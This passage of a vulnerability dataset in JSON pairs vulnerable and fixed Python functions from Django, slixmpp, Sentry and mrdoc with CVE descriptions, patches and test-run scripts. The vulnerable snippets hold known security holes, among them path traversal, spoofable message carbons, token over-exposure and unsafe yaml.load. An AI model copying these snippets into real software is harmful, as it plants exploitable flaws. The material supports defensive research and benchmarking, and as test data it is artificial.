        "snippet": "    def get_available_name(self, name, max_length=None):\n        \"\"\"\n        Return a filename that's free on the target storage system and\n        available for new content to be written to.\n        \"\"\"\n        dir_name, file_name = os.path.split(name)\n        if '..' in pathlib.PurePath(dir_name).parts:\n            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n        validate_file_name(file_name)\n        file_root, file_ext = os.path.splitext(file_name)\n        # If the filename already exists, add an underscore and a random 7\n        # character alphanumeric string (before the file extension, if one\n        # exists) to the filename until the generated filename doesn't exist.\n        # Truncate original name if required, so the new filename does not\n        # exceed the max_length.\n        while self.exists(name) or (max_length and len(name) > max_length):\n            # file_ext includes the dot.\n            name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n            if max_length is None:\n                continue\n            # Truncate file_root if max_length exceeded.\n            truncation = len(name) - max_length\n            if truncation > 0:\n                file_root = file_root[:-truncation]\n                # Entire file_root was truncated in attempt to find an available filename.\n                if not file_root:\n                    raise SuspiciousFileOperation(\n                        'Storage can not find an available filename for \"%s\". '\n                        'Please make sure that the corresponding file field '\n                        'allows sufficient \"max_length\".' % name\n                    )\n                name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n        return name"
      },
      {
        "id": "vul_py_11_3",
        "commit": "c9f648c",
        "file_path": "django/core/files/storage.py",
        "start_line": 99,
        "end_line": 108,
        "snippet": "    def generate_filename(self, filename):\n        \"\"\"\n        Validate the filename by calling get_valid_name() and return a filename\n        to be passed to the save() method.\n        \"\"\"\n        # `filename` may include a path as returned by FileField.upload_to.\n        dirname, filename = os.path.split(filename)\n        if '..' in pathlib.PurePath(dirname).parts:\n            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dirname)\n        return os.path.normpath(os.path.join(dirname, self.get_valid_name(filename)))"
      },
      {
        "id": "vul_py_11_4",
        "commit": "c9f648c",
        "file_path": "django/core/files/storage.py",
        "start_line": 233,
        "end_line": 300,
        "snippet": "    def _save(self, name, content):\n        full_path = self.path(name)\n\n        # Create any intermediate directories that do not exist.\n        directory = os.path.dirname(full_path)\n        if not os.path.exists(directory):\n            try:\n                if self.directory_permissions_mode is not None:\n                    # Set the umask because os.makedirs() doesn't apply the \"mode\"\n                    # argument to intermediate-level directories.\n                    old_umask = os.umask(0o777 & ~self.directory_permissions_mode)\n                    try:\n                        os.makedirs(directory, self.directory_permissions_mode)\n                    finally:\n                        os.umask(old_umask)\n                else:\n                    os.makedirs(directory)\n            except FileExistsError:\n                # There's a race between os.path.exists() and os.makedirs().\n                # If os.makedirs() fails with FileExistsError, the directory\n                # was created concurrently.\n                pass\n        if not os.path.isdir(directory):\n            raise IOError(\"%s exists and is not a directory.\" % directory)\n\n        # There's a potential race condition between get_available_name and\n        # saving the file; it's possible that two threads might return the\n        # same name, at which point all sorts of fun happens. So we need to\n        # try to create the file, but if it already exists we have to go back\n        # to get_available_name() and try again.\n\n        while True:\n            try:\n                # This file has a file path that we can move.\n                if hasattr(content, 'temporary_file_path'):\n                    file_move_safe(content.temporary_file_path(), full_path)\n\n                # This is a normal uploadedfile that we can stream.\n                else:\n                    # The current umask value is masked out by os.open!\n                    fd = os.open(full_path, self.OS_OPEN_FLAGS, 0o666)\n                    _file = None\n                    try:\n                        locks.lock(fd, locks.LOCK_EX)\n                        for chunk in content.chunks():\n                            if _file is None:\n                                mode = 'wb' if isinstance(chunk, bytes) else 'wt'\n                                _file = os.fdopen(fd, mode)\n                            _file.write(chunk)\n                    finally:\n                        locks.unlock(fd)\n                        if _file is not None:\n                            _file.close()\n                        else:\n                            os.close(fd)\n            except FileExistsError:\n                # A new name is needed if the file exists.\n                name = self.get_available_name(name)\n                full_path = self.path(name)\n            else:\n                # OK, the file save worked. Break out of the loop.\n                break\n\n        if self.file_permissions_mode is not None:\n            os.chmod(full_path, self.file_permissions_mode)\n\n        # Store filenames with forward slashes, even on Windows.\n        return name.replace('\\\\', '/')"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_11_1",
        "commit": "4cb35b3",
        "file_path": "django/core/files/storage.py",
        "start_line": 40,
        "end_line": 57,
        "snippet": "    def save(self, name, content, max_length=None):\n        \"\"\"\n        Save new content to the file specified by name. The content should be\n        a proper File object or any Python file-like object, ready to be read\n        from the beginning.\n        \"\"\"\n        # Get the proper name for the file, as it will actually be saved.\n        if name is None:\n            name = content.name\n\n        if not hasattr(content, 'chunks'):\n            content = File(content, name)\n\n        name = self.get_available_name(name, max_length=max_length)\n        name = self._save(name, content)\n        # Ensure that the name returned from the storage system is still valid.\n        validate_file_name(name, allow_relative_path=True)\n        return name"
      },
      {
        "id": "fix_py_11_2",
        "commit": "4cb35b3",
        "file_path": "django/core/files/storage.py",
        "start_line": 68,
        "end_line": 101,
        "snippet": "    def get_available_name(self, name, max_length=None):\n        \"\"\"\n        Return a filename that's free on the target storage system and\n        available for new content to be written to.\n        \"\"\"\n        name = str(name).replace('\\\\', '/')\n        dir_name, file_name = os.path.split(name)\n        if '..' in pathlib.PurePath(dir_name).parts:\n            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n        validate_file_name(file_name)\n        file_root, file_ext = os.path.splitext(file_name)\n        # If the filename already exists, add an underscore and a random 7\n        # character alphanumeric string (before the file extension, if one\n        # exists) to the filename until the generated filename doesn't exist.\n        # Truncate original name if required, so the new filename does not\n        # exceed the max_length.\n        while self.exists(name) or (max_length and len(name) > max_length):\n            # file_ext includes the dot.\n            name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n            if max_length is None:\n                continue\n            # Truncate file_root if max_length exceeded.\n            truncation = len(name) - max_length\n            if truncation > 0:\n                file_root = file_root[:-truncation]\n                # Entire file_root was truncated in attempt to find an available filename.\n                if not file_root:\n                    raise SuspiciousFileOperation(\n                        'Storage can not find an available filename for \"%s\". '\n                        'Please make sure that the corresponding file field '\n                        'allows sufficient \"max_length\".' % name\n                    )\n                name = os.path.join(dir_name, \"%s_%s%s\" % (file_root, get_random_string(7), file_ext))\n        return name"
      },
      {
        "id": "fix_py_11_3",
        "commit": "4cb35b3",
        "file_path": "django/core/files/storage.py",
        "start_line": 103,
        "end_line": 113,
        "snippet": "    def generate_filename(self, filename):\n        \"\"\"\n        Validate the filename by calling get_valid_name() and return a filename\n        to be passed to the save() method.\n        \"\"\"\n        filename = str(filename).replace('\\\\', '/')\n        # `filename` may include a path as returned by FileField.upload_to.\n        dirname, filename = os.path.split(filename)\n        if '..' in pathlib.PurePath(dirname).parts:\n            raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dirname)\n        return os.path.normpath(os.path.join(dirname, self.get_valid_name(filename)))"
      },
      {
        "id": "fix_py_11_4",
        "commit": "4cb35b3",
        "file_path": "django/core/files/storage.py",
        "start_line": 238,
        "end_line": 307,
        "snippet": "    def _save(self, name, content):\n        full_path = self.path(name)\n\n        # Create any intermediate directories that do not exist.\n        directory = os.path.dirname(full_path)\n        if not os.path.exists(directory):\n            try:\n                if self.directory_permissions_mode is not None:\n                    # Set the umask because os.makedirs() doesn't apply the \"mode\"\n                    # argument to intermediate-level directories.\n                    old_umask = os.umask(0o777 & ~self.directory_permissions_mode)\n                    try:\n                        os.makedirs(directory, self.directory_permissions_mode)\n                    finally:\n                        os.umask(old_umask)\n                else:\n                    os.makedirs(directory)\n            except FileExistsError:\n                # There's a race between os.path.exists() and os.makedirs().\n                # If os.makedirs() fails with FileExistsError, the directory\n                # was created concurrently.\n                pass\n        if not os.path.isdir(directory):\n            raise IOError(\"%s exists and is not a directory.\" % directory)\n\n        # There's a potential race condition between get_available_name and\n        # saving the file; it's possible that two threads might return the\n        # same name, at which point all sorts of fun happens. So we need to\n        # try to create the file, but if it already exists we have to go back\n        # to get_available_name() and try again.\n\n        while True:\n            try:\n                # This file has a file path that we can move.\n                if hasattr(content, 'temporary_file_path'):\n                    file_move_safe(content.temporary_file_path(), full_path)\n\n                # This is a normal uploadedfile that we can stream.\n                else:\n                    # The current umask value is masked out by os.open!\n                    fd = os.open(full_path, self.OS_OPEN_FLAGS, 0o666)\n                    _file = None\n                    try:\n                        locks.lock(fd, locks.LOCK_EX)\n                        for chunk in content.chunks():\n                            if _file is None:\n                                mode = 'wb' if isinstance(chunk, bytes) else 'wt'\n                                _file = os.fdopen(fd, mode)\n                            _file.write(chunk)\n                    finally:\n                        locks.unlock(fd)\n                        if _file is not None:\n                            _file.close()\n                        else:\n                            os.close(fd)\n            except FileExistsError:\n                # A new name is needed if the file exists.\n                name = self.get_available_name(name)\n                full_path = self.path(name)\n            else:\n                # OK, the file save worked. Break out of the loop.\n                break\n\n        if self.file_permissions_mode is not None:\n            os.chmod(full_path, self.file_permissions_mode)\n\n        # Ensure the saved path is always relative to the storage root.\n        name = os.path.relpath(full_path, self.location)\n        # Store filenames with forward slashes, even on Windows.\n        return name.replace('\\\\', '/')"
      }
    ],
    "vul_patch": "--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -12,4 +12,7 @@\n             content = File(content, name)\n \n         name = self.get_available_name(name, max_length=max_length)\n-        return self._save(name, content)\n+        name = self._save(name, content)\n+        # Ensure that the name returned from the storage system is still valid.\n+        validate_file_name(name, allow_relative_path=True)\n+        return name\n\n--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -3,6 +3,7 @@\n         Return a filename that's free on the target storage system and\n         available for new content to be written to.\n         \"\"\"\n+        name = str(name).replace('\\\\', '/')\n         dir_name, file_name = os.path.split(name)\n         if '..' in pathlib.PurePath(dir_name).parts:\n             raise SuspiciousFileOperation(\"Detected path traversal attempt in '%s'\" % dir_name)\n\n--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -3,6 +3,7 @@\n         Validate the filename by calling get_valid_name() and return a filename\n         to be passed to the save() method.\n         \"\"\"\n+        filename = str(filename).replace('\\\\', '/')\n         # `filename` may include a path as returned by FileField.upload_to.\n         dirname, filename = os.path.split(filename)\n         if '..' in pathlib.PurePath(dirname).parts:\n\n--- a/django/core/files/storage.py\n+++ b/django/core/files/storage.py\n@@ -64,5 +64,7 @@\n         if self.file_permissions_mode is not None:\n             os.chmod(full_path, self.file_permissions_mode)\n \n+        # Ensure the saved path is always relative to the storage root.\n+        name = os.path.relpath(full_path, self.location)\n         # Store filenames with forward slashes, even on Windows.\n         return name.replace('\\\\', '/')\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-45452:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-45452/bin/python ./runtests.py file_storage.test_generate_filename.GenerateFilenameStorageTests.test_storage_dangerous_paths_dir_name file_storage.tests.FileStorageTests.test_file_save_abs_path\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2021-45452:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/django\ngit apply --whitespace=nowarn /workspace/fix.patch\ncd tests && /workspace/PoC_env/CVE-2021-45452/bin/python ./runtests.py file_storage.test_generate_filename file_storage.tests\n"
  },
  {
    "cve_id": "CVE-2017-5591",
    "cve_description": "An incorrect implementation of \"XEP-0280: Message Carbons\" in multiple XMPP clients allows a remote attacker to impersonate any user, including contacts, in the vulnerable application's display. This allows for various kinds of social engineering attacks. This CVE is for SleekXMPP up to 1.3.1 and Slixmpp all versions up to 1.2.3, as bundled in poezio (0.8 - 0.10) and other products.",
    "cwe_info": {
      "CWE-20": {
        "name": "Improper Input Validation",
        "description": "The product receives input or data, but it does\n        not validate or incorrectly validates that the input has the\n        properties that are required to process the data safely and\n        correctly."
      }
    },
    "repo": "https://github.com/poezio/slixmpp",
    "patch_url": [
      "https://github.com/poezio/slixmpp/commit/22664ee7b86c8e010f312b66d12590fb47160ad8"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_253_1",
        "commit": "6476cfc",
        "file_path": "slixmpp/plugins/xep_0280/carbons.py",
        "start_line": 63,
        "end_line": 64,
        "snippet": "    def _handle_carbon_received(self, msg):\n        self.xmpp.event('carbon_received', msg)"
      },
      {
        "id": "vul_py_253_2",
        "commit": "6476cfc",
        "file_path": "slixmpp/plugins/xep_0280/carbons.py",
        "start_line": 66,
        "end_line": 67,
        "snippet": "    def _handle_carbon_sent(self, msg):\n        self.xmpp.event('carbon_sent', msg)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_253_1",
        "commit": "22664ee",
        "file_path": "slixmpp/plugins/xep_0280/carbons.py",
        "start_line": 63,
        "end_line": 65,
        "snippet": "    def _handle_carbon_received(self, msg):\n        if msg['from'].bare == self.xmpp.boundjid.bare:\n            self.xmpp.event('carbon_received', msg)"
      },
      {
        "id": "fix_py_253_2",
        "commit": "22664ee",
        "file_path": "slixmpp/plugins/xep_0280/carbons.py",
        "start_line": 67,
        "end_line": 69,
        "snippet": "    def _handle_carbon_sent(self, msg):\n        if msg['from'].bare == self.xmpp.boundjid.bare:\n            self.xmpp.event('carbon_sent', msg)"
      }
    ],
    "vul_patch": "--- a/slixmpp/plugins/xep_0280/carbons.py\n+++ b/slixmpp/plugins/xep_0280/carbons.py\n@@ -1,2 +1,3 @@\n     def _handle_carbon_received(self, msg):\n-        self.xmpp.event('carbon_received', msg)\n+        if msg['from'].bare == self.xmpp.boundjid.bare:\n+            self.xmpp.event('carbon_received', msg)\n\n--- a/slixmpp/plugins/xep_0280/carbons.py\n+++ b/slixmpp/plugins/xep_0280/carbons.py\n@@ -1,2 +1,3 @@\n     def _handle_carbon_sent(self, msg):\n-        self.xmpp.event('carbon_sent', msg)\n+        if msg['from'].bare == self.xmpp.boundjid.bare:\n+            self.xmpp.event('carbon_sent', msg)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-39349",
    "cve_description": "Sentry is an error tracking and performance monitoring platform. Starting in version 22.1.0 and prior to version 23.7.2, an attacker with access to a token with few or no scopes can query `/api/0/api-tokens/` for a list of all tokens created by a user, including tokens with greater scopes, and use those tokens in other requests. There is no evidence that the issue was exploited on `sentry.io`. For self-hosted users, it is advised to rotate user auth tokens. A fix is available in version 23.7.2 of `sentry` and `self-hosted`. There are no known workarounds.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/getsentry/sentry",
    "patch_url": [
      "https://github.com/getsentry/sentry/commit/fad12c1150d1135edf9666ea72ca11bc110c1083"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_162_1",
        "commit": "774af7d",
        "file_path": "src/sentry/api/endpoints/api_tokens.py",
        "start_line": 24,
        "end_line": 83,
        "snippet": "class ApiTokensEndpoint(Endpoint):\n    authentication_classes = (SessionAuthentication,)\n    permission_classes = (IsAuthenticated,)\n\n    @method_decorator(never_cache)\n    def get(self, request: Request) -> Response:\n        user_id = request.user.id\n        if is_active_superuser(request):\n            user_id = request.GET.get(\"userId\", user_id)\n\n        token_list = list(\n            ApiToken.objects.filter(application__isnull=True, user_id=user_id).select_related(\n                \"application\"\n            )\n        )\n\n        return Response(serialize(token_list, request.user))\n\n    @method_decorator(never_cache)\n    def post(self, request: Request) -> Response:\n        serializer = ApiTokenSerializer(data=request.data)\n\n        if serializer.is_valid():\n            result = serializer.validated_data\n\n            token = ApiToken.objects.create(\n                user_id=request.user.id,\n                scope_list=result[\"scopes\"],\n                refresh_token=None,\n                expires_at=None,\n            )\n\n            capture_security_activity(\n                account=request.user,\n                type=\"api-token-generated\",\n                actor=request.user,\n                ip_address=request.META[\"REMOTE_ADDR\"],\n                context={},\n                send_email=True,\n            )\n\n            analytics.record(\"api_token.created\", user_id=request.user.id)\n\n            return Response(serialize(token, request.user), status=201)\n        return Response(serializer.errors, status=400)\n\n    @method_decorator(never_cache)\n    def delete(self, request: Request):\n        user_id = request.user.id\n        if is_active_superuser(request):\n            user_id = request.data.get(\"userId\", user_id)\n        token = request.data.get(\"token\")\n        if not token:\n            return Response({\"token\": \"\"}, status=400)\n\n        ApiToken.objects.filter(user_id=user_id, token=token, application__isnull=True).delete()\n\n        analytics.record(\"api_token.deleted\", user_id=request.user.id)\n\n        return Response(status=204)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_162_1",
        "commit": "fad12c1",
        "file_path": "src/sentry/api/authentication.py",
        "start_line": 164,
        "end_line": 169,
        "snippet": "class SessionNoAuthTokenAuthentication(SessionAuthentication):\n    def authenticate(self, request: Request):\n        auth = get_authorization_header(request)\n        if auth:\n            return None\n        return super().authenticate(request)"
      },
      {
        "id": "fix_py_162_2",
        "commit": "fad12c1",
        "file_path": "src/sentry/api/endpoints/api_tokens.py",
        "start_line": 24,
        "end_line": 83,
        "snippet": "class ApiTokensEndpoint(Endpoint):\n    authentication_classes = (SessionNoAuthTokenAuthentication,)\n    permission_classes = (IsAuthenticated,)\n\n    @method_decorator(never_cache)\n    def get(self, request: Request) -> Response:\n        user_id = request.user.id\n        if is_active_superuser(request):\n            user_id = request.GET.get(\"userId\", user_id)\n\n        token_list = list(\n            ApiToken.objects.filter(application__isnull=True, user_id=user_id).select_related(\n                \"application\"\n            )\n        )\n\n        return Response(serialize(token_list, request.user))\n\n    @method_decorator(never_cache)\n    def post(self, request: Request) -> Response:\n        serializer = ApiTokenSerializer(data=request.data)\n\n        if serializer.is_valid():\n            result = serializer.validated_data\n\n            token = ApiToken.objects.create(\n                user_id=request.user.id,\n                scope_list=result[\"scopes\"],\n                refresh_token=None,\n                expires_at=None,\n            )\n\n            capture_security_activity(\n                account=request.user,\n                type=\"api-token-generated\",\n                actor=request.user,\n                ip_address=request.META[\"REMOTE_ADDR\"],\n                context={},\n                send_email=True,\n            )\n\n            analytics.record(\"api_token.created\", user_id=request.user.id)\n\n            return Response(serialize(token, request.user), status=201)\n        return Response(serializer.errors, status=400)\n\n    @method_decorator(never_cache)\n    def delete(self, request: Request):\n        user_id = request.user.id\n        if is_active_superuser(request):\n            user_id = request.data.get(\"userId\", user_id)\n        token = request.data.get(\"token\")\n        if not token:\n            return Response({\"token\": \"\"}, status=400)\n\n        ApiToken.objects.filter(user_id=user_id, token=token, application__isnull=True).delete()\n\n        analytics.record(\"api_token.deleted\", user_id=request.user.id)\n\n        return Response(status=204)"
      }
    ],
    "vul_patch": "--- a/src/sentry/api/endpoints/api_tokens.py\n+++ b/src/sentry/api/authentication.py\n@@ -1,60 +1,6 @@\n-class ApiTokensEndpoint(Endpoint):\n-    authentication_classes = (SessionAuthentication,)\n-    permission_classes = (IsAuthenticated,)\n-\n-    @method_decorator(never_cache)\n-    def get(self, request: Request) -> Response:\n-        user_id = request.user.id\n-        if is_active_superuser(request):\n-            user_id = request.GET.get(\"userId\", user_id)\n-\n-        token_list = list(\n-            ApiToken.objects.filter(application__isnull=True, user_id=user_id).select_related(\n-                \"application\"\n-            )\n-        )\n-\n-        return Response(serialize(token_list, request.user))\n-\n-    @method_decorator(never_cache)\n-    def post(self, request: Request) -> Response:\n-        serializer = ApiTokenSerializer(data=request.data)\n-\n-        if serializer.is_valid():\n-            result = serializer.validated_data\n-\n-            token = ApiToken.objects.create(\n-                user_id=request.user.id,\n-                scope_list=result[\"scopes\"],\n-                refresh_token=None,\n-                expires_at=None,\n-            )\n-\n-            capture_security_activity(\n-                account=request.user,\n-                type=\"api-token-generated\",\n-                actor=request.user,\n-                ip_address=request.META[\"REMOTE_ADDR\"],\n-                context={},\n-                send_email=True,\n-            )\n-\n-            analytics.record(\"api_token.created\", user_id=request.user.id)\n-\n-            return Response(serialize(token, request.user), status=201)\n-        return Response(serializer.errors, status=400)\n-\n-    @method_decorator(never_cache)\n-    def delete(self, request: Request):\n-        user_id = request.user.id\n-        if is_active_superuser(request):\n-            user_id = request.data.get(\"userId\", user_id)\n-        token = request.data.get(\"token\")\n-        if not token:\n-            return Response({\"token\": \"\"}, status=400)\n-\n-        ApiToken.objects.filter(user_id=user_id, token=token, application__isnull=True).delete()\n-\n-        analytics.record(\"api_token.deleted\", user_id=request.user.id)\n-\n-        return Response(status=204)\n+class SessionNoAuthTokenAuthentication(SessionAuthentication):\n+    def authenticate(self, request: Request):\n+        auth = get_authorization_header(request)\n+        if auth:\n+            return None\n+        return super().authenticate(request)\n\n--- /dev/null\n+++ b/src/sentry/api/authentication.py\n@@ -0,0 +1,60 @@\n+class ApiTokensEndpoint(Endpoint):\n+    authentication_classes = (SessionNoAuthTokenAuthentication,)\n+    permission_classes = (IsAuthenticated,)\n+\n+    @method_decorator(never_cache)\n+    def get(self, request: Request) -> Response:\n+        user_id = request.user.id\n+        if is_active_superuser(request):\n+            user_id = request.GET.get(\"userId\", user_id)\n+\n+        token_list = list(\n+            ApiToken.objects.filter(application__isnull=True, user_id=user_id).select_related(\n+                \"application\"\n+            )\n+        )\n+\n+        return Response(serialize(token_list, request.user))\n+\n+    @method_decorator(never_cache)\n+    def post(self, request: Request) -> Response:\n+        serializer = ApiTokenSerializer(data=request.data)\n+\n+        if serializer.is_valid():\n+            result = serializer.validated_data\n+\n+            token = ApiToken.objects.create(\n+                user_id=request.user.id,\n+                scope_list=result[\"scopes\"],\n+                refresh_token=None,\n+                expires_at=None,\n+            )\n+\n+            capture_security_activity(\n+                account=request.user,\n+                type=\"api-token-generated\",\n+                actor=request.user,\n+                ip_address=request.META[\"REMOTE_ADDR\"],\n+                context={},\n+                send_email=True,\n+            )\n+\n+            analytics.record(\"api_token.created\", user_id=request.user.id)\n+\n+            return Response(serialize(token, request.user), status=201)\n+        return Response(serializer.errors, status=400)\n+\n+    @method_decorator(never_cache)\n+    def delete(self, request: Request):\n+        user_id = request.user.id\n+        if is_active_superuser(request):\n+            user_id = request.data.get(\"userId\", user_id)\n+        token = request.data.get(\"token\")\n+        if not token:\n+            return Response({\"token\": \"\"}, status=400)\n+\n+        ApiToken.objects.filter(user_id=user_id, token=token, application__isnull=True).delete()\n+\n+        analytics.record(\"api_token.deleted\", user_id=request.user.id)\n+\n+        return Response(status=204)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-32568",
    "cve_description": "mrdoc is vulnerable to Deserialization of Untrusted Data",
    "cwe_info": {
      "CWE-502": {
        "name": "Deserialization of Untrusted Data",
        "description": "The product deserializes untrusted data without sufficiently ensuring that the resulting data will be valid."
      }
    },
    "repo": "https://github.com/zmister2016/mrdoc",
    "patch_url": [
      "https://github.com/zmister2016/mrdoc/commit/bb49e1287700b4e7681eab544c61093821ce72f6"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_99_1",
        "commit": "ce0c9f1",
        "file_path": "app_doc/import_utils.py",
        "start_line": "26",
        "end_line": "161",
        "snippet": "    def read_zip(self,zip_file_path,create_user):\n        # \\u5bfc\\u5165\\u6d41\\u7a0b\\uff1a\n        # 1\\u3001\\u89e3\\u538bzip\\u538b\\u7f29\\u5305\\u6587\\u4ef6\\u5230temp\\u6587\\u4ef6\\u5939\n        # 2\\u3001\\u904d\\u5386temp\\u6587\\u4ef6\\u5939\\u5185\\u7684\\u89e3\\u538b\\u540e\\u7684.md\\u6587\\u4ef6\n        # 3\\u3001\\u8bfb\\u53d6.md\\u6587\\u4ef6\\u7684\\u6587\\u672c\\u5185\\u5bb9\n        # 4\\u3001\\u5982\\u679c\\u91cc\\u9762\\u5339\\u914d\\u5230\\u76f8\\u5bf9\\u8def\\u5f84\\u7684\\u9759\\u6001\\u6587\\u4ef6\\uff0c\\u4ece\\u6307\\u5b9a\\u6587\\u4ef6\\u5939\\u91cc\\u9762\\u8bfb\\u53d6\n        # 5\\u3001\\u4e0a\\u4f20\\u56fe\\u7247\\uff0c\\u5199\\u5165\\u6570\\u636e\\u5e93\\uff0c\\u4fee\\u6539.md\\u6587\\u4ef6\\u91cc\\u9762\\u7684url\\u8def\\u5f84\n\n        # \\u65b0\\u5efa\\u4e00\\u4e2a\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\\uff0c\\u7528\\u4e8e\\u5b58\\u653e\\u89e3\\u538b\\u7684\\u6587\\u4ef6\n        self.temp_dir = zip_file_path[:-3]\n        os.mkdir(self.temp_dir)\n        # \\u89e3\\u538b zip \\u6587\\u4ef6\\u5230\\u6307\\u5b9a\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\n        shutil.unpack_archive(zip_file_path, extract_dir=self.temp_dir)\n\n        # \\u5904\\u7406\\u6587\\u4ef6\\u5939\\u548c\\u6587\\u4ef6\\u540d\\u7684\\u4e2d\\u6587\\u4e71\\u7801\n        for root, dirs, files in os.walk(self.temp_dir):\n            for dir in dirs:\n                try:\n                    new_dir = dir.encode('cp437').decode('gbk')\n                except:\n                    new_dir = dir.encode('utf-8').decode('utf-8')\n                # print(new_dir)\n                os.rename(os.path.join(root, dir), os.path.join(root, new_dir))\n\n            for file in files:\n                try:\n                    new_file = file.encode('cp437').decode('gbk')\n                except:\n                    new_file = file.encode('utf-8').decode('utf-8')\n                # print(root, new_file)\n                os.rename(os.path.join(root, file), os.path.join(root, new_file))\n\n        # \\u8bfb\\u53d6yaml\\u6587\\u4ef6\n        try:\n            with open(os.path.join(self.temp_dir ,'mrdoc.yaml'),'r',encoding='utf-8') as yaml_file:\n                yaml_str = yaml.load(yaml_file.read())\n                project_name = yaml_str['project_name'] \\\n                    if 'project_name' in yaml_str.keys() else zip_file_path[:-4].split('/')[-1]\n                project_desc = yaml_str['project_desc'] if 'project_desc' in yaml_str.keys() else ''\n                project_role = yaml_str['project_role'] if 'project_role' in yaml_str.keys() else 1\n                editor_mode = yaml_str['editor_mode'] if 'editor_mode' in yaml_str.keys() else 1\n                project_toc = yaml_str['toc']\n                toc_item_list = []\n                for toc in project_toc:\n                    # print(toc)\n                    item = {\n                        'name': toc['name'],\n                        'file': toc['file'],\n                        'parent': 0,\n                    }\n                    toc_item_list.append(item)\n                    if 'children' in toc.keys():\n                        for b in toc['children']:\n                            item = {\n                                'name': b['name'],\n                                'file': b['file'],\n                                'parent': toc['name']\n                            }\n                            toc_item_list.append(item)\n                            if 'children' in b.keys():\n                                for c in b['children']:\n                                    item = {\n                                        'name': c['name'],\n                                        'file': c['file'],\n                                        'parent': b['name']\n                                    }\n                                    toc_item_list.append(item)\n\n\n        except:\n            logger.error(_(\"\\u672a\\u53d1\\u73b0yaml\\u6587\\u4ef6\"))\n            project_name = zip_file_path[:-4].split('/')[-1]\n            project_desc = ''\n            project_role = 1\n            editor_mode = 1\n            project_toc = False\n\n        # \\u5f00\\u542f\\u4e8b\\u52a1\n        with transaction.atomic():\n            save_id = transaction.savepoint()\n            try:\n                # \\u65b0\\u5efa\\u6587\\u96c6\n                project = Project.objects.create(\n                    name=project_name,\n                    intro=project_desc,\n                    role=project_role,\n                    create_user=create_user\n                )\n                if project_toc is False:\n                    # \\u904d\\u5386\\u4e34\\u65f6\\u6587\\u4ef6\\u5939\\u4e2d\\u7684\\u6240\\u6709\\u6587\\u4ef6\\u548c\\u6587\\u4ef6\\u5939\n                    for f in os.listdir(self.temp_dir):\n                        # \\u83b7\\u53d6 .md \\u6587\\u4ef6\n                        if f.endswith('.md'):\n                            # print(f)\n                            # \\u8bfb\\u53d6 .md \\u6587\\u4ef6\\u6587\\u672c\\u5185\\u5bb9\n                            with open(os.path.join(self.temp_dir,f),'r',encoding='utf-8') as md_file:\n                                md_content = md_file.read()\n                                md_content = self.operat_md_media(md_content,create_user)\n                                # \\u65b0\\u5efa\\u6587\\u6863\n                                doc = Doc.objects.create(\n                                    name = f[:-3],\n                                    pre_content = md_content,\n                                    top_doc = project.id,\n                                    status = 0,\n                                    editor_mode = editor_mode,\n                                    create_user = create_user\n                                )\n                else:\n                    for i in toc_item_list:\n                        with open(os.path.join(self.temp_dir,i['file']),'r',encoding='utf-8') as md_file:\n                            md_content = md_file.read()\n                            md_content = self.operat_md_media(md_content, create_user)\n                            # \\u65b0\\u5efa\\u6587\\u6863\n                            doc = Doc.objects.create(\n                                name=i['name'],\n                                pre_content=md_content,\n                                top_doc=project.id,\n                                parent_doc = (Doc.objects.get(top_doc=project.id,name=i['parent'])).id \\\n                                    if i['parent'] != 0 else 0,\n                                status=0,\n                                editor_mode=editor_mode,\n                                create_user=create_user\n                            )\n            except:\n                logger.exception(_(\"\\u89e3\\u6790\\u5bfc\\u5165\\u6587\\u4ef6\\u5f02\\u5e38\"))\n                # \\u56de\\u6eda\\u4e8b\\u52a1\n                transaction.savepoint_rollback(save_id)\n\n            transaction.savepoint_commit(save_id)\n        try:\n            shutil.rmtree(self.temp_dir)\n            os.remove(zip_file_path)\n            return project.id\n        except:\n            logger.exception(_(\"\\u5220\\u9664\\u4e34\\u65f6\\u6587\\u4ef6\\u5f02\\u5e38\"))\n            return None"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_99_1",
        "commit": "bb49e12",
        "file_path": "app_doc/import_utils.py",
        "start_line": "26",
        "end_line": "161",
